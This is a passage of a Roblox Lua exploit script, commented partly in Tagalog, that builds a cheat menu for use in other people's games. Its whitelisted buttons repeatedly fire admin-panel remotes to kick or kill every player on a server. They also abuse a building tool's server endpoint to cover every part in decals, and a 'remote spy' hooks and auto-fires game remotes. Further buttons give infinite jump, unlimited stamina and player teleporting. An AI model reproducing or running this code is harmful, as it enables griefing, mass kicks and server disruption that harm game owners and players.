	[9396953751] = true,
    [7116363414] = true,
    [7410409939] = true,
    [4885856980] = true,
	[4091230894] = true,
	[8619228276] = true,
	[8555340291] = true,
	[3575675921] = true,
	[7540853237] = true,
	[560604146] = true,
	[846984019] = true,
    [player.UserId] = true -- OPTIONAL: auto allow self
}

if not whitelist[localPlayer.UserId] then
	localPlayer:Kick("Whitelist only. Sorry po.")
	return
end

while task.wait(0.01) do
	for _, plr in pairs(Players:GetPlayers()) do
		local args = {
			[1] = plr.Name
		}

		local gui = localPlayer:WaitForChild("PlayerGui", 9e9)
			:WaitForChild("ExtraUI", 9e9)
			:WaitForChild("AdminPanel", 9e9)
			:WaitForChild("TrollFrame", 9e9)

		gui:GetChildren()[7]
			:WaitForChild("Event", 9e9)
			:FireServer(unpack(args))
	end
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("KICK ALL (WHITELISTED ONLY)", function()
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local whitelist = {
    [8172987891] = true,
    [3317684405] = true, 
	[9842730123] = true,
    [3736307974] = true, 
    [9000796247] = true, 
    [2685394161] = true,  
    [6226066651] = true,
	[9925586155] = true,
	[6213315646] = true,  
    [8625608074] = true,
	[8708504286] = true,
	[2757397228] = true,
	[4602182711] = true,
	[5804682562] = true,
	[2577804945] = true,
	[7761002961] = true,
	[8970489737] = true,
	[8174283950] = true,
	[2860982002] = true,
	[8456876972] = true,
    [8797707488] = true,
    [956682331] = true,
    [423338358] = true,
	[9396953751] = true,
    [7116363414] = true,
    [7410409939] = true,
    [4885856980] = true,
	[4091230894] = true,
	[8619228276] = true,
	[8555340291] = true,
	[3575675921] = true,
	[7540853237] = true,
	[560604146] = true,
	[846984019] = true,
    [player.UserId] = true -- OPTIONAL: auto allow self
}

if not whitelist[localPlayer.UserId] then
	localPlayer:Kick("Whitelist only.")
	return
end

for _, plr in ipairs(Players:GetPlayers()) do
	local args = {
		[1] = plr.Name,
		[2] = ""
	}

	local gui = localPlayer:WaitForChild("PlayerGui", 9e9)
		:WaitForChild("ExtraUI", 9e9)
		:WaitForChild("AdminPanel", 9e9)
		:WaitForChild("MainFrame", 9e9)

	gui:GetChildren()[5]
		:WaitForChild("Event", 9e9)
		:FireServer(unpack(args))
end
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLICK THIS TO SET THE SKY IF YOU HAVE BTOOLS IN YOUR INVENTORY", function()
		--for monsy
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					--spawn(function()
					SetName(v,"Sky")
					AddMesh(v)
					--end)
					--spawn(function()
					SetMesh(v,"8006679977")
					SetTexture(v,id)
					--end)
					MeshResize(v,Vector3.new(50,50,50))
					SetLocked(v,true)
				end
			end
		end
		Sky("92062079482012")

-----------------------------------

local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,id,Enum.NormalId.Front)
	
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,id,Enum.NormalId.Back)
	
						SpawnDecal(v,Enum.NormalId.Right)
						AddDecal(v,id,Enum.NormalId.Right)
	
						SpawnDecal(v,Enum.NormalId.Left)
						AddDecal(v,id,Enum.NormalId.Left)
	
						SpawnDecal(v,Enum.NormalId.Bottom)
						AddDecal(v,id,Enum.NormalId.Bottom)
	
						SpawnDecal(v,Enum.NormalId.Top)
						AddDecal(v,id,Enum.NormalId.Top)
					end)
				end
			end 
		end
		spam("92062079482012")

-----------
end)

--// 8 Buttons in Main Menu
addMainMenuButton("KILL ALL ONLY WHITELISTED CAN USE THIS ! ", function()
	--// SERVICES
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

local whitelist = {
    [8172987891] = true,
    [3317684405] = true, 
	[9842730123] = true,
    [3736307974] = true, 
    [9000796247] = true, 
    [2685394161] = true,  
    [6226066651] = true,
	[9925586155] = true,
	[6213315646] = true,  
    [8625608074] = true,
	[8708504286] = true,
	[2757397228] = true,
	[4602182711] = true,
	[5804682562] = true,
	[2577804945] = true,
	[7761002961] = true,
	[8970489737] = true,
	[8174283950] = true,
	[2860982002] = true,
	[8456876972] = true,
    [8797707488] = true,
    [956682331] = true,
    [423338358] = true,
	[9396953751] = true,
    [7116363414] = true,
    [7410409939] = true,
    [4885856980] = true,
	[4091230894] = true,
	[8619228276] = true,
	[8555340291] = true,
	[3575675921] = true,
	[7540853237] = true,
	[560604146] = true,
	[846984019] = true,
    [player.UserId] = true -- OPTIONAL: auto allow self
}

--// CHECK IF WHITELISTED
if not whitelist[player.UserId] then
    warn("Access denied: User not whitelisted.")
    return -- Hihinto ang script kung hindi whitelisted
end

--// MAIN SCRIPT (SAFE NA TO RUN)
for _, targetPlayer in ipairs(Players:GetPlayers()) do
    local args = {
        targetPlayer.Name,
        "MONSY TO GAGO"
    }
    
    player
        :WaitForChild("PlayerGui")
        :WaitForChild("ExtraUI")
        :WaitForChild("AdminPanel")
        :WaitForChild("MainFrame")
        :WaitForChild("Frame")
        :WaitForChild("Event")
        :FireServer(unpack(args))
end
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["REMOTES"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("REMOTES ONLY FOR MONSY ! ", function()
	local Players = game:GetService("Players")
local player = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- GUI Setup
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = ""
gui.ResetOnSpawn = false

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 700, 0, 400)
main.Position = UDim2.new(0.5, -350, 0.5, -200)
main.BackgroundColor3 = Color3.fromRGB(255,255,255)
main.BorderSizePixel = 0
main.Parent = gui
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 15)

local titleBar = Instance.new("Frame", main)
titleBar.Size = UDim2.new(1, 0, 0, 35)
titleBar.BackgroundColor3 = Color3.fromRGB(255,255,255)
titleBar.BorderSizePixel = 0
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 15)

local title = Instance.new("TextLabel", titleBar)
title.Size = UDim2.new(1, 0, 1, 0)
title.BackgroundTransparency = 1
title.Text = "MONSY REMOTE SPY"
title.TextColor3 = Color3.fromRGB(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 17

-- Left Panel
local leftPanel = Instance.new("Frame", main)
leftPanel.Size = UDim2.new(0, 200, 0, 330)
leftPanel.Position = UDim2.new(0, 15, 0, 50)
leftPanel.BackgroundColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", leftPanel).CornerRadius = UDim.new(0, 10)

local leftScroll = Instance.new("ScrollingFrame", leftPanel)
leftScroll.Size = UDim2.new(1, -10, 1, -10)
leftScroll.Position = UDim2.new(0, 5, 0, 5)
leftScroll.BackgroundTransparency = 1
leftScroll.ScrollBarThickness = 4
leftScroll.CanvasSize = UDim2.new(0, 0, 0, 0)

local leftLayout = Instance.new("UIListLayout", leftScroll)
leftLayout.Padding = UDim.new(0, 3)
leftLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Right Panel
local rightPanel = Instance.new("Frame", main)
rightPanel.Size = UDim2.new(0, 450, 0, 330)
rightPanel.Position = UDim2.new(0, 235, 0, 50)
rightPanel.BackgroundColor3 = Color3.fromRGB(255,255,255)
Instance.new("UICorner", rightPanel).CornerRadius = UDim.new(0, 10)

local logScroll = Instance.new("ScrollingFrame", rightPanel)
logScroll.Size = UDim2.new(1, -10, 1, -50)
logScroll.Position = UDim2.new(0, 5, 0, 5)
logScroll.BackgroundTransparency = 1
logScroll.ScrollBarThickness = 4
logScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y

local logLayout = Instance.new("UIListLayout", logScroll)
logLayout.Padding = UDim.new(0, 4)
logLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Buttons
local btnContainer = Instance.new("Frame", rightPanel)
btnContainer.Size = UDim2.new(1, -10, 0, 35)
btnContainer.Position = UDim2.new(0.5, -175, 1, -40)
btnContainer.BackgroundTransparency = 1

local function makeBtn(text, x)
    local btn = Instance.new("TextButton", btnContainer)
    btn.Size = UDim2.new(0, 80, 1, 0)
    btn.Position = UDim2.new(0, x, 0, 0)
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
    return btn
end

local fireBtn = makeBtn("FIRE", 0)
local startBtn = makeBtn("START", 90)
local clearBtn = makeBtn("CLEAR", 180)
local copyBtn = makeBtn("COPY", 270)

-- Variables
local selectedRemote = nil
local autoFiring = false
local conn = nil
local buttonMap = {}
local insertionQueue = insertionQueue or {}

local function tostr(v)
    if typeof(v) == "Instance" then
        return "game." .. v:GetFullName()
    elseif typeof(v) == "string" then
        return '"' .. v:gsub('"', '\\"') .. '"'
    else
        return tostring(v)
    end
end

-- Get Remotes
local function getRemotes()
    local remotes = {}
    local function scan(parent)
        for _, obj in pairs(parent:GetChildren()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                table.insert(remotes, obj)
            end
            scan(obj)
        end
    end
    for _, v in pairs({game.ReplicatedStorage, game.Workspace, game.StarterGui, game.StarterPack, game.StarterPlayer.StarterPlayerScripts}) do
        if v then scan(v) end
    end
    return remotes
end

-- Create Button
local function createButton(remote)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -10, 0, 25)
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.Text = remote.Name
    btn.TextColor3 = Color3.fromRGB(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 14
    btn.Parent = leftScroll
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)

    buttonMap[remote] = btn

    btn.MouseButton1Click:Connect(function()
        for _, b in pairs(leftScroll:GetChildren()) do
            if b:IsA("TextButton") then b.BackgroundColor3 = Color3.fromRGB(255,255,255) end
        end
        btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        selectedRemote = remote
    end)
end

-- Add Log
local function addLog(text)
    for line in text:gmatch("[^\n]+") do
        local label = Instance.new("TextLabel", logScroll)
        label.Size = UDim2.new(1, -10, 0, 18)
        label.BackgroundTransparency = 1
        label.Text = line
        label.TextColor3 = Color3.fromRGB(0,0,0)
        label.Font = Enum.Font.Roboto
        label.TextSize = 13
        label.TextXAlignment = Enum.TextXAlignment.Left
        label.TextWrapped = true
    end
    task.delay(0.01, function()
        logScroll.CanvasPosition = Vector2.new(0, logScroll.AbsoluteCanvasSize.Y)
    end)
end

-- Auto Insert
local function autoInsertToQueue(remote, argsTable)
    local log = "Remote Fired: " .. remote:GetFullName()
    local argsStr = "{"
    for i, arg in ipairs(argsTable) do
        argsStr = argsStr .. (i > 1 and ", " or "") .. tostr(arg)
    end
    argsStr = argsStr .. "}"

    local scriptLine = "local args = " .. argsStr .. "\n\n" .. tostr(remote) .. ":FireServer(unpack(args))"

    table.insert(insertionQueue, { log, "To", scriptLine, nil, remote, argsTable, "FireServer" })

    local btn = buttonMap[remote]
    if btn and btn.Parent then
        for _, b in pairs(leftScroll:GetChildren()) do
            if b:IsA("TextButton") then
                b.BackgroundColor3 = Color3.fromRGB(255,255,255)
            end
        end
        btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        selectedRemote = remote
    end

    addLog(log)
    addLog(scriptLine)
    addLog("")
end

-- Hook Remotes
local oldFire = {}
local function hookRemote(remote)
    if remote:IsA("RemoteEvent") then
        oldFire[remote] = remote.FireServer
        remote.FireServer = function(self, ...)
            local args = {...}
            task.spawn(autoInsertToQueue, remote, args)
            return oldFire[remote](self, ...)
        end
    elseif remote:IsA("RemoteFunction") then
        oldFire[remote] = remote.InvokeServer
        remote.InvokeServer = function(self, ...)
            local args = {...}
            task.spawn(autoInsertToQueue, remote, args)
            return oldFire[remote](self, ...)
        end
    end
end

-- Initialize
local remotes = getRemotes()
for _, r in pairs(remotes) do
    createButton(r)
    pcall(hookRemote, r)
end
leftScroll.CanvasSize = UDim2.new(0, 0, 0, #remotes * 28)

-- Buttons
fireBtn.MouseButton1Click:Connect(function()
    if not selectedRemote then return addLog("Select remote first!") end
    autoInsertToQueue(selectedRemote, {})
    pcall(function()
        if selectedRemote:IsA("RemoteEvent") then
            selectedRemote:FireServer()
        else
            selectedRemote:InvokeServer()
        end
    end)
end)

startBtn.MouseButton1Click:Connect(function()
    if not selectedRemote then return addLog("Select remote first!") end
    autoFiring = not autoFiring
    startBtn.Text = autoFiring and "RUNNING" or "START"
    addLog(autoFiring and "Auto firing started." or "Stopped auto firing.")
    if conn then conn:Disconnect() end
    if autoFiring then
        conn = RunService.Heartbeat:Connect(function()
            pcall(function()
                if selectedRemote:IsA("RemoteEvent") then
                    selectedRemote:FireServer()
                else
                    selectedRemote:InvokeServer()
                end
            end)
        end)
    end
end)

clearBtn.MouseButton1Click:Connect(function()
    for _, v in pairs(logScroll:GetChildren()) do
        if v:IsA("TextLabel") then v:Destroy() end
    end
    addLog("Logs cleared.")
end)

copyBtn.MouseButton1Click:Connect(function()
    if not selectedRemote then return addLog("Select remote first!") end
    local scriptLine = "local args = {}\n\n" .. tostr(selectedRemote) .. ":FireServer(unpack(args))"
    if setclipboard then
        setclipboard(scriptLine)
        addLog("Copied to clipboard.")
    else
        addLog("Clipboard not supported.")
    end
    addLog(scriptLine)
end)

-- Dragging
local dragging, dragStart, startPos = false, nil, nil
titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = main.Position
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local delta = input.Position - dragStart
        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)
end)

----------------------------------------------------------------
-- PLAYER LIST
----------------------------------------------------------------
local playerListPanel = allTabPanels["PLAYER LIST"]

local function refreshPlayers()
	for _, child in ipairs(playerListPanel:GetChildren()) do
		if child:IsA("Frame") then child:Destroy() end
	end

	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= player then
			local row = new("Frame", {
				Parent = playerListPanel,
				Size = UDim2.new(1, -16, 0, 40),
				BackgroundColor3 = Color3.fromRGB(255,255,255),
				BorderSizePixel = 0,
			})
			new("UICorner", {CornerRadius = UDim.new(0,6), Parent = row})

			new("TextLabel", {
				Parent = row,
				Size = UDim2.new(0.6, 0, 1, 0),
				Position = UDim2.new(0, 8, 0, 0),
				BackgroundTransparency = 1,
				Text = plr.DisplayName .. " (@" .. plr.Name .. ")",
				TextColor3 = Color3.new(0,0,0),
				Font = Enum.Font.RobotoMono,
				TextSize = 14,
				TextXAlignment = Enum.TextXAlignment.Left,
			})

			local buttonContainer = new("Frame", {
				Parent = row,
				Size = UDim2.new(0.4, 0, 1, 0),
				Position = UDim2.new(0.6, 0, 0, 0),
				BackgroundTransparency = 1,
			})
			new("UIListLayout", {
				Parent = buttonContainer,
				FillDirection = Enum.FillDirection.Horizontal,
				Padding = UDim.new(0, 4),
				HorizontalAlignment = Enum.HorizontalAlignment.Right,
			})

			local function makeMiniBtn(text, callback)
				local b = new("TextButton", {
					Parent = buttonContainer,
					Size = UDim2.new(0, 60, 0, 28),
					BackgroundColor3 = Color3.fromRGB(230,230,230),
					Text = text,
					TextColor3 = Color3.new(0,0,0),
					Font = Enum.Font.RobotoMono,
					TextSize = 10,
				})
				new("UICorner", {CornerRadius = UDim.new(0,4), Parent = b})
				b.MouseButton1Click:Connect(function()
					if callback then callback(plr) end
				end)
			end

			makeMiniBtn("VIEW", function(p) 
				if p.Character and p.Character:FindFirstChildOfClass("Humanoid") then
					pcall(function() workspace.CurrentCamera.CameraSubject = p.Character end)
				end
			end)
			makeMiniBtn("UNVIEW", function() 
				pcall(function() workspace.CurrentCamera.CameraSubject = player.Character end)
			end)
			makeMiniBtn("BRING", function(p)
				if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
					p.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
				end
			end)
			makeMiniBtn("UNBRING", function() end)
			makeMiniBtn("TP", function(p)
				if p.Character and p.Character:FindFirstChild("HumanoidRootPart") and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
					player.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRootPart.CFrame
				end
			end)
		end
	end
end

refreshPlayers()
Players.PlayerAdded:Connect(refreshPlayers)
Players.PlayerRemoving:Connect(refreshPlayers)

----------------------------------------------------------------
-- WORLD (ADVANCED)
----------------------------------------------------------------
local worldPanel = allTabPanels["WORLD"]
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local UIS = game:GetService("UserInputService")

local robotoMono = Enum.Font.RobotoMono   -- ← para madali i-reuse

----------------------------------------------------------------
-- INFINITE JUMP
----------------------------------------------------------------
local infJump = false
local infJumpBtn = Instance.new("TextButton")
infJumpBtn.Parent = worldPanel
infJumpBtn.Size = UDim2.new(1,0,0,36)
infJumpBtn.BackgroundColor3 = Color3.fromRGB(245,245,245)
infJumpBtn.Text = "// @ Infinite Jump: OFF"
infJumpBtn.TextColor3 = Color3.new(0,0,0)
infJumpBtn.Font = robotoMono
infJumpBtn.TextSize = 15
Instance.new("UICorner", infJumpBtn).CornerRadius = UDim.new(0,6)

infJumpBtn.MouseButton1Click:Connect(function()
    infJump = not infJump
    infJumpBtn.Text = "// @ Infinite Jump: " .. (infJump and "ON" or "OFF")
end)

UIS.JumpRequest:Connect(function()
    if infJump and LocalPlayer.Character then
        local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
    end
end)

----------------------------------------------------------------
-- TIME CHANGER
----------------------------------------------------------------
local timeBtn = Instance.new("TextButton")
timeBtn.Parent = worldPanel
timeBtn.Size = UDim2.new(1,0,0,36)
timeBtn.BackgroundColor3 = Color3.fromRGB(245,245,245)
timeBtn.Text = "// @ Time: Day"
timeBtn.TextColor3 = Color3.new(0,0,0)
timeBtn.Font = robotoMono
timeBtn.TextSize = 15
Instance.new("UICorner", timeBtn).CornerRadius = UDim.new(0,6)

local isDay = true
timeBtn.MouseButton1Click:Connect(function()
    isDay = not isDay
    Lighting.ClockTime = isDay and 14 or 0
    timeBtn.Text = "// @ Time: " .. (isDay and "Day" or "Night")
end)

----------------------------------------------------------------
-- WEATHER CHANGER
----------------------------------------------------------------
local weatherBtn = Instance.new("TextButton")
weatherBtn.Parent = worldPanel
weatherBtn.Size = UDim2.new(1,0,0,36)
weatherBtn.BackgroundColor3 = Color3.fromRGB(245,245,245)
weatherBtn.Text = "// @ Weather: Clear"
weatherBtn.TextColor3 = Color3.new(0,0,0)
weatherBtn.Font = robotoMono
weatherBtn.TextSize = 15
Instance.new("UICorner", weatherBtn).CornerRadius = UDim.new(0,6)

local fog = false
weatherBtn.MouseButton1Click:Connect(function()
    fog = not fog
    Lighting.FogEnd = fog and 100 or 100000
    weatherBtn.Text = "// @ Weather: " .. (fog and "Foggy" or "Clear")
end)

----------------------------------------------------------------
-- UNLIMITED STAMINA (UNIVERSAL)
----------------------------------------------------------------
local staminaOn = false
local staminaConn
local staminaBtn = Instance.new("TextButton")
staminaBtn.Parent = worldPanel
staminaBtn.Size = UDim2.new(1,0,0,36)
staminaBtn.BackgroundColor3 = Color3.fromRGB(245,245,245)
staminaBtn.Text = "// @ Unlimited Stamina: OFF"
staminaBtn.TextColor3 = Color3.new(0,0,0)
staminaBtn.Font = robotoMono
staminaBtn.TextSize = 15
Instance.new("UICorner", staminaBtn).CornerRadius = UDim.new(0,6)

local function getStaminaValue()
    if not LocalPlayer.Character then return end
    for _,v in pairs(LocalPlayer.Character:GetDescendants()) do
        if v:IsA("NumberValue") then
            local n = v.Name:lower()
            if n:find("stamina") or n:find("energy") then
                return v
            end
        end
    end
end

staminaBtn.MouseButton1Click:Connect(function()
    staminaOn = not staminaOn
    staminaBtn.Text = "// @ Unlimited Stamina: " .. (staminaOn and "ON" or "OFF")
    if staminaOn then
        staminaConn = RunService.RenderStepped:Connect(function()
            local stamina = getStaminaValue()
            if stamina then
                stamina.Value = stamina.Value + 100
            end
        end)
    else
        if staminaConn then staminaConn:Disconnect() end
    end
end)

----------------------------------------------------------------
-- SPEED SLIDER (1–500)
----------------------------------------------------------------
